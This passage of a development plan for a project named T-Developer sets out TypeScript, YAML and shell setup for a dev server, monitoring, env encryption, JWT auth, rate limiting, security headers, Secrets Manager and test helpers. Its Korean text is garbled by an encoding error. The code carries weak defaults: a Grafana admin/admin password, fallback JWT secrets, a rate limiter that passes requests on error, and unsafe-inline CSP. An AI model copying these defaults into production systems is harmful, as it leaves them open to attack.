echo "\nğŸ“‹ ì„¤ì¹˜ëœ ë„êµ¬ ë²„ì „:"
echo "TypeScript: $(tsc --version)"
echo "AWS CDK: $(cdk --version)"
echo "Serverless: $(serverless --version)"
echo "PM2: $(pm2 --version)"
echo "Lerna: $(lerna --version)"
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ê¶Œí•œ ë¶€ì—¬: `chmod +x scripts/install-global-tools.sh`
- ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰: `./scripts/install-global-tools.sh`

### SubTask 0.3.5: ë¡œì»¬ ê°œë°œ ì„œë²„ ì„¤ì •
**ëª©í‘œ**: ê°œë°œìš© ë¡œì»¬ ì„œë²„ í™˜ê²½ êµ¬ì„±

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// scripts/dev-server.ts
import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import cors from 'cors';

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: "http://localhost:3000",
    methods: ["GET", "POST"]
  }
});

// ë¯¸ë“¤ì›¨ì–´
app.use(cors());
app.use(express.json());

// í—¬ìŠ¤ ì²´í¬
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: new Date().toISOString(),
    services: {
      api: 'running',
      websocket: 'running',
      database: 'pending'
    }
  });
});

// WebSocket ì—°ê²°
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);
  
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
  });
});

const PORT = process.env.PORT || 8000;
httpServer.listen(PORT, () => {
  console.log(`âœ… ê°œë°œ ì„œë²„ ì‹¤í–‰ ì¤‘: http://localhost:${PORT}`);
  console.log(`ğŸ“¡ WebSocket ì„œë²„ ì‹¤í–‰ ì¤‘: ws://localhost:${PORT}`);
});
```

```json
// nodemon.json
{
  "watch": ["src", "scripts"],
  "ext": "ts,js,json",
  "ignore": ["src/**/*.spec.ts", "node_modules"],
  "exec": "ts-node",
  "env": {
    "NODE_ENV": "development"
  }
}
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- ê°œë°œ ì„œë²„ ì‹¤í–‰: `npm run dev`
- í—¬ìŠ¤ ì²´í¬ í™•ì¸: http://localhost:8000/health

---

### SubTask 0.3.6: ëª¨ë‹ˆí„°ë§ ë„êµ¬ ì„¤ì •
**ëª©í‘œ**: ê°œë°œ í™˜ê²½ ëª¨ë‹ˆí„°ë§ ë„êµ¬ ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/utils/monitoring.ts
import { StatsD } from 'node-statsd';
import winston from 'winston';
import { CloudWatchTransport } from 'winston-cloudwatch';

// StatsD í´ë¼ì´ì–¸íŠ¸ (ë¡œì»¬ ê°œë°œìš©)
export const metrics = new StatsD({
  host: process.env.STATSD_HOST || 'localhost',
  port: parseInt(process.env.STATSD_PORT || '8125'),
  prefix: 't-developer.',
  mock: process.env.NODE_ENV === 'test'
});

// Winston ë¡œê±° ì„¤ì •
export const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.splat(),
    winston.format.json()
  ),
  defaultMeta: { service: 't-developer' },
  transports: [
    new winston.transports.Console({
      format: winston.format.combine(
        winston.format.colorize(),
        winston.format.simple()
      )
    }),
    new winston.transports.File({ 
      filename: 'logs/error.log', 
      level: 'error' 
    }),
    new winston.transports.File({ 
      filename: 'logs/combined.log' 
    })
  ]
});

// CloudWatch ì „ì†¡ (í”„ë¡œë•ì…˜)
if (process.env.NODE_ENV === 'production') {
  logger.add(new CloudWatchTransport({
    logGroupName: '/aws/t-developer',
    logStreamName: `${process.env.NODE_ENV}-${new Date().toISOString().split('T')[0]}`,
    awsRegion: process.env.AWS_REGION
  }));
}
```

```yaml
# docker-compose.monitoring.yml
version: '3.8'

services:
  grafana:
    image: grafana/grafana:latest
    container_name: t-developer-grafana
    ports:
      - "3001:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
    volumes:
      - ./docker/grafana:/var/lib/grafana

  prometheus:
    image: prom/prometheus:latest
    container_name: t-developer-prometheus
    ports:
      - "9090:9090"
    volumes:
      - ./docker/prometheus/prometheus.yml:/etc/prometheus/prometheus.yml
      - ./docker/prometheus/data:/prometheus

  statsd:
    image: graphiteapp/graphite-statsd
    container_name: t-developer-statsd
    ports:
      - "8125:8125/udp"
      - "8126:8126"
      - "2003:2003"
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- `docker-compose -f docker-compose.monitoring.yml up -d` ì‹¤í–‰
- Grafana ì ‘ì†: http://localhost:3001 (admin/admin)
- Prometheus ì ‘ì†: http://localhost:9090

---

## Task 0.4: ë³´ì•ˆ ë° ì¸ì¦ ê¸°ì´ˆ ì„¤ì •

### SubTask 0.4.1: í™˜ê²½ ë³€ìˆ˜ ì•”í˜¸í™” ì„¤ì •
**ëª©í‘œ**: ë¯¼ê°í•œ ì •ë³´ ë³´í˜¸ë¥¼ ìœ„í•œ ì•”í˜¸í™” ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/utils/crypto.ts
import crypto from 'crypto';
import fs from 'fs/promises';
import path from 'path';

export class EnvCrypto {
  private algorithm = 'aes-256-gcm';
  private keyPath = path.join(process.cwd(), '.env.key');
  
  async generateKey(): Promise<string> {
    const key = crypto.randomBytes(32).toString('hex');
    await fs.writeFile(this.keyPath, key, { mode: 0o600 });
    console.log('âœ… ì•”í˜¸í™” í‚¤ê°€ ìƒì„±ë˜ì—ˆìŠµë‹ˆë‹¤: .env.key');
    console.log('âš ï¸  ì´ íŒŒì¼ì„ ì•ˆì „í•˜ê²Œ ë³´ê´€í•˜ê³  ì ˆëŒ€ ì»¤ë°‹í•˜ì§€ ë§ˆì„¸ìš”!');
    return key;
  }
  
  async encrypt(text: string): Promise<string> {
    const key = await this.getKey();
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(this.algorithm, Buffer.from(key, 'hex'), iv);
    
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return iv.toString('hex') + ':' + authTag.toString('hex') + ':' + encrypted;
  }
  
  async decrypt(encryptedText: string): Promise<string> {
    const key = await this.getKey();
    const parts = encryptedText.split(':');
    const iv = Buffer.from(parts[0], 'hex');
    const authTag = Buffer.from(parts[1], 'hex');
    const encrypted = parts[2];
    
    const decipher = crypto.createDecipheriv(this.algorithm, Buffer.from(key, 'hex'), iv);
    decipher.setAuthTag(authTag);
    
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
  
  private async getKey(): Promise<string> {
    try {
      return await fs.readFile(this.keyPath, 'utf8');
    } catch (error) {
      throw new Error('ì•”í˜¸í™” í‚¤ë¥¼ ì°¾ì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤. generateKey()ë¥¼ ë¨¼ì € ì‹¤í–‰í•˜ì„¸ìš”.');
    }
  }
}

// í™˜ê²½ ë³€ìˆ˜ ì•”í˜¸í™” ìŠ¤í¬ë¦½íŠ¸
export async function encryptEnvFile(): Promise<void> {
  const crypto = new EnvCrypto();
  const envPath = path.join(process.cwd(), '.env');
  const encryptedPath = path.join(process.cwd(), '.env.encrypted');
  
  const envContent = await fs.readFile(envPath, 'utf8');
  const lines = envContent.split('\n');
  
  const encryptedLines = await Promise.all(lines.map(async (line) => {
    if (line.includes('=') && !line.startsWith('#')) {
      const [key, value] = line.split('=', 2);
      if (key.includes('SECRET') || key.includes('KEY') || key.includes('PASSWORD')) {
        const encrypted = await crypto.encrypt(value);
        return `${key}=ENC:${encrypted}`;
      }
    }
    return line;
  }));
  
  await fs.writeFile(encryptedPath, encryptedLines.join('\n'));
  console.log('âœ… í™˜ê²½ ë³€ìˆ˜ê°€ ì•”í˜¸í™”ë˜ì—ˆìŠµë‹ˆë‹¤: .env.encrypted');
}
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- ì•”í˜¸í™” í‚¤ ìƒì„±: `ts-node scripts/generate-crypto-key.ts`
- `.env.key`ë¥¼ ì•ˆì „í•œ ê³³ì— ë³´ê´€
- `.gitignore`ì— `.env.key` ì¶”ê°€ í™•ì¸

### SubTask 0.4.2: JWT í† í° ê´€ë¦¬ ì„¤ì •
**ëª©í‘œ**: API ì¸ì¦ì„ ìœ„í•œ JWT ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/utils/auth.ts
import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';
import { promisify } from 'util';

export interface TokenPayload {
  userId: string;
  email: string;
  role: 'user' | 'admin';
}

export class AuthManager {
  private readonly accessTokenSecret: string;
  private readonly refreshTokenSecret: string;
  private readonly accessTokenExpiry = '15m';
  private readonly refreshTokenExpiry = '7d';
  
  constructor() {
    this.accessTokenSecret = process.env.JWT_ACCESS_SECRET || 'dev-access-secret';
    this.refreshTokenSecret = process.env.JWT_REFRESH_SECRET || 'dev-refresh-secret';
    
    if (process.env.NODE_ENV === 'production' && this.accessTokenSecret === 'dev-access-secret') {
      throw new Error('JWT secrets must be set in production');
    }
  }
  
  async generateTokens(payload: TokenPayload): Promise<{
    accessToken: string;
    refreshToken: string;
  }> {
    const accessToken = jwt.sign(payload, this.accessTokenSecret, {
      expiresIn: this.accessTokenExpiry,
      issuer: 't-developer',
      audience: 'api'
    });
    
    const refreshToken = jwt.sign(
      { userId: payload.userId }, 
      this.refreshTokenSecret, 
      {
        expiresIn: this.refreshTokenExpiry,
        issuer: 't-developer',
        audience: 'refresh'
      }
    );
    
    return { accessToken, refreshToken };
  }
  
  async verifyAccessToken(token: string): Promise<TokenPayload> {
    try {
      return jwt.verify(token, this.accessTokenSecret, {
        issuer: 't-developer',
        audience: 'api'
      }) as TokenPayload;
    } catch (error) {
      throw new Error('Invalid access token');
    }
  }
  
  async verifyRefreshToken(token: string): Promise<{ userId: string }> {
    try {
      return jwt.verify(token, this.refreshTokenSecret, {
        issuer: 't-developer',
        audience: 'refresh'
      }) as { userId: string };
    } catch (error) {
      throw new Error('Invalid refresh token');
    }
  }
  
  async hashPassword(password: string): Promise<string> {
    return bcrypt.hash(password, 12);
  }
  
  async verifyPassword(password: string, hash: string): Promise<boolean> {
    return bcrypt.compare(password, hash);
  }
}
```

### SubTask 0.4.3: API Rate Limiting ì„¤ì •
**ëª©í‘œ**: API ë‚¨ìš© ë°©ì§€ë¥¼ ìœ„í•œ Rate Limiting

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/middleware/rate-limiter.ts
import { Request, Response, NextFunction } from 'express';
import Redis from 'ioredis';

export interface RateLimitOptions {
  windowMs: number;
  max: number;
  message?: string;
  keyGenerator?: (req: Request) => string;
}

export class RateLimiter {
  private redis: Redis;
  
  constructor() {
    this.redis = new Redis({
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT || '6379'),
      password: process.env.REDIS_PASSWORD
    });
  }
  
  middleware(options: RateLimitOptions) {
    const {
      windowMs = 60 * 1000, // 1ë¶„
      max = 100,
      message = 'Too many requests',
      keyGenerator = (req) => req.ip
    } = options;
    
    return async (req: Request, res: Response, next: NextFunction) => {
      const key = `rate-limit:${keyGenerator(req)}`;
      const now = Date.now();
      const window = now - windowMs;
      
      try {
        // ì‹œê°„ window ê¸°ë°˜ ì¹´ìš´íŒ…
        await this.redis.zremrangebyscore(key, '-inf', window);
        const count = await this.redis.zcard(key);
        
        if (count >= max) {
          return res.status(429).json({
            error: message,
            retryAfter: Math.ceil(windowMs / 1000)
          });
        }
        
        // ìš”ì²­ ê¸°ë¡
        await this.redis.zadd(key, now, `${now}-${Math.random()}`);
        await this.redis.expire(key, Math.ceil(windowMs / 1000));
        
        // í—¤ë” ì„¤ì •
        res.setHeader('X-RateLimit-Limit', max);
        res.setHeader('X-RateLimit-Remaining', Math.max(0, max - count - 1));
        res.setHeader('X-RateLimit-Reset', new Date(now + windowMs).toISOString());
        
        next();
      } catch (error) {
        console.error('Rate limiter error:', error);
        // Rate limiter ì˜¤ë¥˜ ì‹œ ìš”ì²­ í†µê³¼
        next();
      }
    };
  }
  
  // APIë³„ ë‹¤ë¥¸ ì œí•œ ì„¤ì •
  apiLimits() {
    return {
      general: this.middleware({ windowMs: 60000, max: 100 }),
      auth: this.middleware({ windowMs: 300000, max: 5 }), // 5ë¶„ì— 5íšŒ
      create: this.middleware({ windowMs: 3600000, max: 10 }), // 1ì‹œê°„ì— 10íšŒ
      ai: this.middleware({ windowMs: 60000, max: 20 }) // 1ë¶„ì— 20íšŒ
    };
  }
}
```

### SubTask 0.4.4: CORS ë° ë³´ì•ˆ í—¤ë” ì„¤ì •
**ëª©í‘œ**: ì›¹ ë³´ì•ˆì„ ìœ„í•œ í—¤ë” ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/middleware/security.ts
import helmet from 'helmet';
import cors from 'cors';
import { Request, Response, NextFunction } from 'express';

export const securityHeaders = helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "wss:", "https:"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
});

export const corsOptions = cors({
  origin: (origin, callback) => {
    const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(',') || [
      'http://localhost:3000',
      'http://localhost:8000'
    ];
    
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],
  exposedHeaders: ['X-Request-ID', 'X-RateLimit-Limit', 'X-RateLimit-Remaining']
});

// Request ID ë¯¸ë“¤ì›¨ì–´
export const requestId = (req: Request, res: Response, next: NextFunction) => {
  const id = req.headers['x-request-id'] || `req_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  req.id = id as string;
  res.setHeader('X-Request-ID', id);
  next();
};

// Security ê°ì‚¬ ë¡œê¹…
export const securityAudit = (req: Request, res: Response, next: NextFunction) => {
  const startTime = Date.now();
  
  res.on('finish', () => {
    const duration = Date.now() - startTime;
    const audit = {
      timestamp: new Date().toISOString(),
      requestId: req.id,
      method: req.method,
      path: req.path,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      statusCode: res.statusCode,
      duration
    };
    
    if (res.statusCode >= 400) {
      console.warn('Security audit:', audit);
    }
  });
  
  next();
};
```

### SubTask 0.4.5: Secrets Manager í†µí•©
**ëª©í‘œ**: AWS Secrets Managerë¥¼ í†µí•œ ì‹œí¬ë¦¿ ê´€ë¦¬

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/config/secrets-manager.ts
import { 
  SecretsManagerClient, 
  GetSecretValueCommand,
  CreateSecretCommand,
  UpdateSecretCommand 
} from '@aws-sdk/client-secrets-manager';

export class SecretsManager {
  private client: SecretsManagerClient;
  private cache: Map<string, { value: any; expiry: number }> = new Map();
  private cacheTTL = 300000; // 5ë¶„
  
  constructor() {
    this.client = new SecretsManagerClient({
      region: process.env.AWS_REGION || 'us-east-1'
    });
  }
  
  async getSecret(secretName: string): Promise<any> {
    // ìºì‹œ í™•ì¸
    const cached = this.cache.get(secretName);
    if (cached && cached.expiry > Date.now()) {
      return cached.value;
    }
    
    try {
      const command = new GetSecretValueCommand({ SecretId: secretName });
      const response = await this.client.send(command);
      
      let secretValue: any;
      if (response.SecretString) {
        secretValue = JSON.parse(response.SecretString);
      } else if (response.SecretBinary) {
        const buff = Buffer.from(response.SecretBinary);
        secretValue = buff.toString('utf-8');
      }
      
      // ìºì‹œì— ì €ì¥
      this.cache.set(secretName, {
        value: secretValue,
        expiry: Date.now() + this.cacheTTL
      });
      
      return secretValue;
    } catch (error) {
      console.error(`Failed to retrieve secret ${secretName}:`, error);
      throw error;
    }
  }
  
  async createOrUpdateSecret(secretName: string, secretValue: any): Promise<void> {
    const secretString = typeof secretValue === 'string' 
      ? secretValue 
      : JSON.stringify(secretValue);
    
    try {
      // ë¨¼ì € ì—…ë°ì´íŠ¸ ì‹œë„
      const updateCommand = new UpdateSecretCommand({
        SecretId: secretName,
        SecretString: secretString
      });
      await this.client.send(updateCommand);
      console.log(`âœ… Secret updated: ${secretName}`);
    } catch (error: any) {
      if (error.name === 'ResourceNotFoundException') {
        // ì—†ìœ¼ë©´ ìƒì„±
        const createCommand = new CreateSecretCommand({
          Name: secretName,
          SecretString: secretString,
          Description: `T-Developer secret: ${secretName}`
        });
        await this.client.send(createCommand);
        console.log(`âœ… Secret created: ${secretName}`);
      } else {
        throw error;
      }
    }
    
    // ìºì‹œ ë¬´íš¨í™”
    this.cache.delete(secretName);
  }
  
  // í™˜ê²½ë³„ ì‹œí¬ë¦¿ ë¡œë“œ
  async loadEnvironmentSecrets(): Promise<void> {
    const environment = process.env.NODE_ENV || 'development';
    const secretName = `t-developer/${environment}/config`;
    
    try {
      const secrets = await this.getSecret(secretName);
      
      // í™˜ê²½ ë³€ìˆ˜ë¡œ ì„¤ì •
      Object.entries(secrets).forEach(([key, value]) => {
        if (!process.env[key]) {
          process.env[key] = value as string;
        }
      });
      
      console.log(`âœ… Loaded secrets for ${environment} environment`);
    } catch (error) {
      console.warn(`âš ï¸  No secrets found for ${environment}, using local .env`);
    }
  }
}

// ì´ˆê¸°í™” ìŠ¤í¬ë¦½íŠ¸
export async function initializeSecrets(): Promise<void> {
  const manager = new SecretsManager();
  
  if (process.env.NODE_ENV === 'production') {
    await manager.loadEnvironmentSecrets();
  }
}
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- AWS Secrets Managerì—ì„œ ì‹œí¬ë¦¿ ìƒì„±
- ê°œë°œ/ìŠ¤í…Œì´ì§•/í”„ë¡œë•ì…˜ í™˜ê²½ë³„ ì‹œí¬ë¦¿ ì„¤ì •
- IAM ê¶Œí•œì— Secrets Manager ì½ê¸° ê¶Œí•œ ì¶”ê°€

---

## Task 0.5: í…ŒìŠ¤íŠ¸ í™˜ê²½ êµ¬ì¶•

### SubTask 0.5.1: ë‹¨ìœ„ í…ŒìŠ¤íŠ¸ í—¬í¼ ìƒì„±
**ëª©í‘œ**: í…ŒìŠ¤íŠ¸ ì‘ì„±ì„ ìœ„í•œ ìœ í‹¸ë¦¬í‹° í•¨ìˆ˜

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/tests/helpers/test-utils.ts
import { DynamoDBClient } from '@aws-sdk/client-dynamodb';
import { DynamoDBDocumentClient } from '@aws-sdk/lib-dynamodb';
import { mockClient } from 'aws-sdk-client-mock';
import { jest } from '@jest/globals';

// DynamoDB Mock
export const dynamoDBMock = mockClient(DynamoDBDocumentClient);

// í…ŒìŠ¤íŠ¸ ë°ì´í„° ìƒì„±ê¸°
export class TestDataGenerator {
  static project(overrides?: Partial<any>) {
    return {
      id: `proj_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      userId: 'user_test_123',
      name: 'Test Project',
      description: 'A test project description',
      status: 'analyzing',
      createdAt: new Date().toISOString(),
      ...overrides
    };
  }
  
  static agentExecution(overrides?: Partial<any>) {
    return {
      id: `exec_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      projectId: 'proj_test_123',
      agentName: 'TestAgent',
      agentType: 'test',
      status: 'completed',
      startedAt: new Date().toISOString(),
      completedAt: new Date().toISOString(),
      ...overrides
    };
  }
  
  static user(overrides?: Partial<any>) {
    return {
      id: `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      email: 'test@example.com',
      role: 'user',
      createdAt: new Date().toISOString(),
      ...overrides
    };
  }
}

// ë¹„ë™ê¸° í…ŒìŠ¤íŠ¸ í—¬í¼
export async function waitFor(
  condition: () => boolean | Promise<boolean>,
  timeout = 5000,
  interval = 100
): Promise<void> {
  const startTime = Date.now();
  
  while (Date.now() - startTime < timeout) {
    if (await condition()) {
      return;
    }
    await new Promise(resolve => setTimeout(resolve, interval));
  }
  
  throw new Error('Timeout waiting for condition');
}

// Mock íƒ€ì´ë¨¸ í—¬í¼
export class MockTimer {
  private timers: NodeJS.Timer[] = [];
  
  setTimeout(fn: Function, delay: number): NodeJS.Timer {
    const timer = setTimeout(fn, delay);
    this.timers.push(timer);
    return timer;
  }
  
  clearAll(): void {
    this.timers.forEach(timer => clearTimeout(timer));
    this.timers = [];
  }
}

// í™˜ê²½ ë³€ìˆ˜ ëª¨í‚¹
export function mockEnvironment(vars: Record<string, string>): () => void {
  const original = { ...process.env };
  
  Object.entries(vars).forEach(([key, value]) => {
    process.env[key] = value;
  });
  
  return () => {
    process.env = original;
  };
}
```

### SubTask 0.5.2: í†µí•© í…ŒìŠ¤íŠ¸ ì„¤ì •
**ëª©í‘œ**: API í†µí•© í…ŒìŠ¤íŠ¸ í™˜ê²½ êµ¬ì¶•

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/tests/helpers/test-server.ts
import express, { Express } from 'express';
import { Server } from 'http';
import { AddressInfo } from 'net';

export class TestServer {
  private app: Express;
  private server?: Server;
  
  constructor() {
    this.app = express();
    this.setupMiddleware();
  }
  
  private setupMiddleware(): void {
    this.app.use(express.json());
    this.app.use(express.urlencoded({ extended: true }));
  }
  
  async start(): Promise<number> {
    return new Promise((resolve) => {
      this.server = this.app.listen(0, () => {
        const port = (this.server!.address() as AddressInfo).port;
        resolve(port);
      });
    });
  }
  
  async stop(): Promise<void> {
    return new Promise((resolve, reject) => {
      if (this.server) {
        this.server.close((err) => {
          if (err) reject(err);
          else resolve();
        });
      } else {
        resolve();
      }
    });
  }
  
  getApp(): Express {
    return this.app;
  }
  
  getUrl(port: number): string {
    return `http://localhost:${port}`;
  }
}

// API í…ŒìŠ¤íŠ¸ í´ë¼ì´ì–¸íŠ¸
export class TestClient {
  constructor(private baseURL: string) {}
  
  async get(path: string, headers?: Record<string, string>) {
    const response = await fetch(`${this.baseURL}${path}`, {
      method: 'GET',
      headers
    });
    return {
      status: response.status,
      body: await response.json()
    };
  }
  
  async post(path: string, data?: any, headers?: Record<string, string>) {
    const response = await fetch(`${this.baseURL}${path}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...headers
      },
      body: JSON.stringify(data)
    });
    return {
      status: response.status,
      body: await response.json()
    };
  }
}
```

### SubTask 0.5.3: E2E í…ŒìŠ¤íŠ¸ í™˜ê²½
**ëª©í‘œ**: End-to-End í…ŒìŠ¤íŠ¸ë¥¼ ìœ„í•œ í™˜ê²½ êµ¬ì„±

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/tests/e2e/setup.ts
import { spawn, ChildProcess } from 'child_process';
import { DynamoDBClient, CreateTableCommand } from '@aws-sdk/client-dynamodb';

export class E2ETestEnvironment {
  private processes: ChildProcess[] = [];
  private dynamoClient: DynamoDBClient;
  
  constructor() {
    this.dynamoClient = new DynamoDBClient({
      endpoint: 'http://localhost:8000',
      region: 'us-east-1',
      credentials: {
        accessKeyId: 'test',
        secretAccessKey: 'test'
      }
    });
  }
  
  async setup(): Promise<void> {
    console.log('ğŸ”§ Setting up E2E test environment...');
    
    // 1. DynamoDB Local ì‹œì‘
    await this.startDynamoDBLocal();
    
    // 2. Redis ì‹œì‘
    await this.startRedis();
    
    // 3. í…ŒìŠ¤íŠ¸ í…Œì´ë¸” ìƒì„±
    await this.createTestTables();
    
    // 4. ì• í”Œë¦¬ì¼€ì´ì…˜ ì„œë²„ ì‹œì‘
    await this.startAppServer();
    
    console.log('âœ… E2E test environment ready!');
  }
  
  async teardown(): Promise<void> {
    console.log('ğŸ§¹ Cleaning up E2E test environment...');
    
    // ëª¨ë“  í”„ë¡œì„¸ìŠ¤ ì¢…ë£Œ
    this.processes.forEach(process => {
      process.kill('SIGTERM');
    });
    
    // í”„ë¡œì„¸ìŠ¤ ì¢…ë£Œ ëŒ€ê¸°
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    console.log('âœ… E2E test environment cleaned up!');
  }
  
  private async startDynamoDBLocal(): Promise<void> {
    const dynamodb = spawn('docker', [
      'run',
      '--rm',
      '-p', '8000:8000',
      'amazon/dynamodb-local',
      '-jar', 'DynamoDBLocal.jar',
      '-inMemory'
    ]);
    
    this.processes.push(dynamodb);
    
    // DynamoDB ì‹œì‘ ëŒ€ê¸°
    await this.waitForPort(8000, 10000);
  }
  
  private async startRedis(): Promise<void> {
    const redis = spawn('docker', [
      'run',
      '--rm',
      '-p', '6379:6379',
      'redis:7-alpine'
    ]);
    
    this.processes.push(redis);
    
    // Redis ì‹œì‘ ëŒ€ê¸°
    await this.waitForPort(6379, 10000);
  }
  
  private async createTestTables(): Promise<void> {
    const tables = [
      {
        TableName: 'test-projects',
        KeySchema: [{ AttributeName: 'id', KeyType: 'HASH' }],
        AttributeDefinitions: [{ AttributeName: 'id', AttributeType: 'S' }],
        BillingMode: 'PAY_PER_REQUEST'
      }
    ];
    
    for (const table of tables) {
      try {
        await this.dynamoClient.send(new CreateTableCommand(table));
      } catch (error: any) {
        if (error.name !== 'ResourceInUseException') {
          throw error;
        }
      }
    }
  }
  
  private async startAppServer(): Promise<void> {
    const app = spawn('npm', ['run', 'start:test'], {
      env: {
        ...process.env,
        NODE_ENV: 'test',
        PORT: '8080'
      }
    });
    
    this.processes.push(app);
    
    // ì•± ì„œë²„ ì‹œì‘ ëŒ€ê¸°
    await this.waitForPort(8080, 30000);
  }
  
  private async waitForPort(port: number, timeout: number): Promise<void> {
    const startTime = Date.now();
    
    while (Date.now() - startTime < timeout) {
      try {
        const response = await fetch(`http://localhost:${port}`);
        if (response.ok || response.status === 404) {
          return;
        }
      } catch (error) {
        // ì—°ê²° ì‹¤íŒ¨, ì¬ì‹œë„
      }
      
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    throw new Error(`Port ${port} did not become available within ${timeout}ms`);
  }
}
```

### SubTask 0.5.4: í…ŒìŠ¤íŠ¸ ë°ì´í„° ì‹œë”
**ëª©í‘œ**: í…ŒìŠ¤íŠ¸ìš© ì´ˆê¸° ë°ì´í„° ìƒì„±

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/tests/fixtures/seed-data.ts
import { DynamoDBDocumentClient, PutCommand, BatchWriteCommand } from '@aws-sdk/lib-dynamodb';
import { faker } from '@faker-js/faker';

export class TestDataSeeder {
  constructor(private docClient: DynamoDBDocumentClient) {}
  
  async seedAll(): Promise<void> {
    await Promise.all([
      this.seedUsers(),
      this.seedProjects(),
      this.seedComponents()
    ]);
  }
  
  async seedUsers(count: number = 10): Promise<void> {
    const users = Array.from({ length: count }, () => ({
      id: `user_${faker.string.uuid()}`,
      email: faker.internet.email(),
      name: faker.person.fullName(),
      role: faker.helpers.arrayElement(['user', 'admin']),
      apiKey: `sk_test_${faker.string.alphanumeric(32)}`,
      createdAt: faker.date.past().toISOString()
    }));
    
    for (const user of users) {
      await this.docClient.send(new PutCommand({
        TableName: 'test-users',
        Item: user
      }));
    }
    
    console.log(`âœ… Seeded ${count} test users`);
  }
  
  async seedProjects(count: number = 20): Promise<void> {
    const projects = Array.from({ length: count }, () => ({
      id: `proj_${faker.string.uuid()}`,
      userId: `user_${faker.string.uuid()}`,
      name: faker.commerce.productName(),
      description: faker.lorem.paragraph(),
      projectType: faker.helpers.arrayElement(['web', 'api', 'mobile']),
      status: faker.helpers.arrayElement(['analyzing', 'building', 'completed']),
      uiFramework: faker.helpers.arrayElement(['react', 'vue', 'angular']),
      createdAt: faker.date.past().toISOString()
    }));
    
    // ë°°ì¹˜ ì“°ê¸° (25ê°œì”©)
    const chunks = this.chunkArray(projects, 25);
    
    for (const chunk of chunks) {
      await this.docClient.send(new BatchWriteCommand({
        RequestItems: {
          'test-projects': chunk.map(item => ({
            PutRequest: { Item: item }
          }))
        }
      }));
    }
    
    console.log(`âœ… Seeded ${count} test projects`);
  }
  
  async seedComponents(count: number = 50): Promise<void> {
    const components = Array.from({ length: count }, () => ({
      id: `comp_${faker.string.uuid()}`,
      name: faker.hacker.noun(),
      version: faker.system.semver(),
      language: faker.helpers.arrayElement(['javascript', 'typescript', 'python']),
      framework: faker.helpers.arrayElement(['react', 'express', 'fastapi']),
      description: faker.lorem.sentence(),
      downloads: faker.number.int({ min: 0, max: 1000000 }),
      stars: faker.number.int({ min: 0, max: 50000 }),
      lastUpdated: faker.date.recent().toISOString()
    }));
    
    const chunks = this.chunkArray(components, 25);
    
    for (const chunk of chunks) {
      await this.docClient.send(new BatchWriteCommand({
        RequestItems: {
          'test-components': chunk.map(item => ({
            PutRequest: { Item: item }
          }))
        }
      }));
    }
    
    console.log(`âœ… Seeded ${count} test components`);
  }
  
  private chunkArray<T>(array: T[], size: number): T[][] {
    const chunks: T[][] = [];
    for (let i = 0; i < array.length; i += size) {
      chunks.push(array.slice(i, i + size));
    }
    return chunks;
  }
}
```

### SubTask 0.5.5: í…ŒìŠ¤íŠ¸ ì‹¤í–‰ ìŠ¤í¬ë¦½íŠ¸
